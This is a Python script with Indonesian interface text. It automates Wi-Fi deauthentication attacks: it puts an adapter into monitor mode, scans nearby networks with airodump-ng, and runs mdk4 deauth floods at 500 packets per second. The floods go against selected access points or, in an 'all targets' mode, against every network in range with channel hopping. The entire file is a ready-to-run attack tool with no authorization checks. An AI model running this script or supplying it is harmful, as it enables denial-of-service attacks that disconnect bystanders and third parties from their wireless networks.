#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "magenta": "\033[35m",
    "gray": "\033[90m",
}

GREEN = COLORS["green"]
RED = COLORS["red"]
CYAN = COLORS["cyan"]
YELLOW = COLORS["yellow"]
MAGENTA = COLORS["magenta"]
GRAY = COLORS["gray"]

BOX_WIDTH = 40

# ================= CLEAR SCREEN =================

def clear_screen():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()

# ================= DRAW BOX =================

def draw_box_top(color=CYAN):
    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")

def draw_box_bottom(color=CYAN):
    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")

def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
    inner = f" {title}"
    pad = BOX_WIDTH - len(inner)
    if pad < 0:
        inner = inner[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text_color}{BOLD}{inner}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

# ================= LOADING =================

def loading(text, duration=1):
    """Tampilkan loading dengan animasi spinner"""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def loading_with_text(text, duration=2):
    """Loading dengan efek berubah-ubah"""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    glitch_chars = "!@#$%^&*"
    
    for i in range(duration * 10):
        display_text = ""
        for char in text:
            if char == " ":
                display_text += " "
            elif random.random() < 0.1:
                display_text += random.choice(glitch_chars)
            else:
                display_text += char
                
        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

# ================= GLITCH FUNCTIONS =================

def glitch_print(text, color=GREEN, cycles=8):
    """Animasi glitch sederhana"""
    chars = "!@#$%^&*<>/\\|~?"
    n = len(text)
    revealed = [False] * n
    
    for c in range(cycles):
        display = []
        for i, ch in enumerate(text):
            if ch == " ":
                display.append(" ")
                continue
            if revealed[i]:
                display.append(ch)
            else:
                if random.random() < (c / cycles):
                    revealed[i] = True
                    display.append(ch)
                else:
                    display.append(random.choice(chars))
        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.04)
    
    print(f"\r  {color}{text}{RESET}")

# ================= WIRELESS FUNCTIONS =================

def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces

def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"

def run_command(cmd, show_output=False):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result

def start_monitor_mode(adapter):
    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
    
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(0.3)
    return monitor_iface

def scan_networks(adapter, duration=10):
    loading_with_text("Scanning WiFi networks...", 1)
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    start_time = time.time()
    
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        
        if remaining <= 0:
            break
            
        for i in range(len(chars)):
            if proc.poll() is not None or elapsed >= duration:
                break
            sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}Scanning... {remaining}s remaining{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
            elapsed = int(time.time() - start_time)
            remaining = max(0, duration - elapsed)
    
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({"bssid": bssid, "channel": channel, "essid": essid})

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks

def stop_monitor_mode(monitor_iface):
    loading("Membersihkan monitor mode...", 1)
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)

# ================= PARSE FUNCTIONS =================

def parse_target_selection(choice_str, total_targets):
    if not choice_str.strip():
        return []
    
    selected = set()
    parts = re.split(r'[,\s]+', choice_str.strip())
    
    for part in parts:
        if not part:
            continue
            
        if '-' in part:
            try:
                start, end = part.split('-')
                start_num = int(start.strip())
                end_num = int(end.strip())
                if start_num > end_num:
                    start_num, end_num = end_num, start_num
                for num in range(start_num, end_num + 1):
                    if 1 <= num <= total_targets:
                        selected.add(num)
            except ValueError:
                continue
        else:
            try:
                num = int(part.strip())
                if 1 <= num <= total_targets:
                    selected.add(num)
            except ValueError:
                continue
    
    return sorted(selected)

# ================= SELECT FUNCTIONS =================

def select_interface():
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("DEAUTH ATTACK", CYAN, YELLOW)
    draw_box_bottom(CYAN)
    
    loading("Scanning interfaces...", 1)
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print(f"\n  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
        sys.exit(1)

    print(f"\n  {BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"  {GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            glitch_print(f"LOCKED: {selected}", CYAN)
            time.sleep(0.3)
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

def select_targets(networks):
    if not networks:
        print(f"\n  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
        return None

    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("PILIH TARGET", CYAN, YELLOW)
    draw_box_bottom(CYAN)

    print(f"\n  {YELLOW}Format: 1 3 5  atau  2-5  atau  1,3,5-7{RESET}\n")

    header = f"{'No':<3} {'ESSID':<25} {'CH':<3} {'BSSID'}"
    print(f"  {header}")
    print(f"  {YELLOW}{'=' * 55}{RESET}")
    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:25]
        print(f"  {GREEN}{idx:<3}{RESET} {essid:<25} {net['channel']:<3} {net['bssid']}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
        
        if not choice:
            print(f"  {RED}[!] Input tidak boleh kosong.{RESET}")
            continue
        
        selected_indices = parse_target_selection(choice, len(networks))
        
        if not selected_indices:
            print(f"  {RED}[!] Input salah atau tidak ada target valid.{RESET}")
            continue
        
        selected_targets = [networks[idx - 1] for idx in selected_indices]
        
        print(f"\n  {GREEN}[✓] Terpilih {len(selected_targets)} target:{RESET}")
        for target in selected_targets:
            print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
        
        confirm = input(f"\n  {YELLOW}Lanjutkan? (y/n): {RESET}").strip().lower()
        if confirm in ['y', 'yes', '']:
            glitch_print(f"TARGET LOCKED: {len(selected_targets)} targets", GREEN)
            return selected_targets
        else:
            print(f"  {YELLOW}Mengulang pemilihan...{RESET}\n")
            continue

def select_attack_mode():
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("MODE SERANGAN", CYAN, YELLOW)
    draw_box_bottom(CYAN)
    
    print(f"\n  {BOLD}Pilih mode serangan:{RESET}")
    print(f"  {GREEN}1.{RESET} Target spesifik (pilih target sendiri)")
    print(f"  {GREEN}2.{RESET} Semua target (serang semua jaringan)")

    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-2] : {RESET}").strip()
        if choice == "1":
            return "target"
        if choice == "2":
            return "all"
        print(f"  {RED}[!] Pilih 1 atau 2.{RESET}")

# ================= MDK4 FUNCTIONS =================

def prompt_keyboard_interrupt_action():
    print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
    print(f"  {GREEN}1.{RESET} Pilih target lagi")
    print(f"  {GREEN}2.{RESET} Kembali ke menu")
    print(f"  {GREEN}3.{RESET} Keluar")

    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-3] : {RESET}").strip()
        if choice == "1":
            return "restart"
        if choice == "2":
            return "menu"
        if choice == "3":
            return "exit"
        print(f"  {RED}[!] Input salah, pilih 1, 2, atau 3.{RESET}")

def run_deauth_mdk4(targets, monitor_iface):
    if not targets:
        print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
        return
    
    target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
    try:
        for target in targets:
            target_file.write(f"{target['bssid']},{target['channel']}\n")
        target_file.close()
        
        clear_screen()
        draw_box_top(RED)
        draw_box_title("🔥 MDK4 OP MODE 🔥", RED, YELLOW)
        draw_box_bottom(RED)
        
        print(f"\n  {CYAN}[*] Menyerang {len(targets)} target...{RESET}")
        for target in targets:
            print(f"  - {target['essid'][:20]} | CH {target['channel']} | {target['bssid']}")
        
        mdk4_cmd = [
            "sudo", "mdk4", monitor_iface, "d",
            "-B", target_file.name,
            "-c", "h",
            "-s", "500"
        ]
        
        print(f"\n  {YELLOW}[!] Packet Rate: 500 packets/detik{RESET}")
        print(f"  {YELLOW}[!] Channel Hopping: AKTIF{RESET}")
        print(f"\n  {GRAY}Command: {' '.join(mdk4_cmd)}{RESET}")
        print(f"\n  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
        
        proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Tampilkan output MDK4 dengan indentasi
        try:
            while True:
                output = proc.stdout.readline()
                if output == '' and proc.poll() is not None:
                    break
                if output:
                    print(f"  {output.strip()}")
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}[!] Menghentikan MDK4...{RESET}")
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
            print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
            time.sleep(0.5)
            
    finally:
        try:
            os.unlink(target_file.name)
        except OSError:
            pass

def run_deauth_all_mdk4(monitor_iface):
    clear_screen()
    draw_box_top(RED)
    draw_box_title("🔥 MDK4 OP MODE - ALL TARGETS 🔥", RED, YELLOW)
    draw_box_bottom(RED)
    
    print(f"\n  {YELLOW}[!] Menyerang SEMUA jaringan yang terdeteksi!{RESET}")
    
    mdk4_cmd = [
        "sudo", "mdk4", monitor_iface, "d",
        "-c", "h",
        "-s", "500"
    ]
    
    print(f"\n  {CYAN}[*] Packet Rate: 500 packets/detik{RESET}")
    print(f"  {CYAN}[*] Channel Hopping: AKTIF{RESET}")
    print(f"\n  {GRAY}Command: {' '.join(mdk4_cmd)}{RESET}")
    print(f"\n  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
    
    proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    try:
        while True:
            output = proc.stdout.readline()
            if output == '' and proc.poll() is not None:
                break
            if output:
                print(f"  {output.strip()}")
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!] Menghentikan MDK4...{RESET}")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
        time.sleep(0.5)

def back_to_menu():
    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
    if not os.path.exists(menu_path):
        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
    if os.path.exists(menu_path):
        os.execvp(sys.executable, [sys.executable, menu_path])
    else:
        print(f"\n  {RED}[✗] deauth-menu.py tidak ditemukan.{RESET}")
        input("\n  Tekan Enter untuk kembali...")

# ================= MAIN =================

def main():
    adapter = None
    monitor_iface = None

    while True:
        try:
            if monitor_iface is None:
                adapter = select_interface()
                monitor_iface = start_monitor_mode(adapter)
            
            attack_mode = select_attack_mode()
            
            if attack_mode == "target":
                clear_screen()
                draw_box_top(CYAN)
                draw_box_title("SCAN WIFI", CYAN, YELLOW)
                draw_box_bottom(CYAN)
                
                print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
                scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
                
                if scan_input.isdigit() and int(scan_input) > 0:
                    scan_duration = int(scan_input)
                else:
                    scan_duration = 10
                
                networks = scan_networks(monitor_iface, duration=scan_duration)
                targets = select_targets(networks)
                
                if targets is None or not targets:
                    print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
                    stop_monitor_mode(monitor_iface)
                    return
                
                run_deauth_mdk4(targets, monitor_iface)
                
                # Setelah serangan selesai
                print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
                input()
                stop_monitor_mode(monitor_iface)
                back_to_menu()
                break
            else:
                run_deauth_all_mdk4(monitor_iface)
                
                # Setelah serangan selesai
                print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
                input()
                stop_monitor_mode(monitor_iface)
                back_to_menu()
                break

        except KeyboardInterrupt:
            action = prompt_keyboard_interrupt_action()
            if action == "restart":
                print(f"\n  {YELLOW}Mengulang ke pemilihan target...{RESET}")
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                    monitor_iface = None
                continue
            elif action == "menu":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                back_to_menu()
            elif action == "exit":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                clear_screen()
                sys.exit(0)

if __name__ == "__main__":
    main()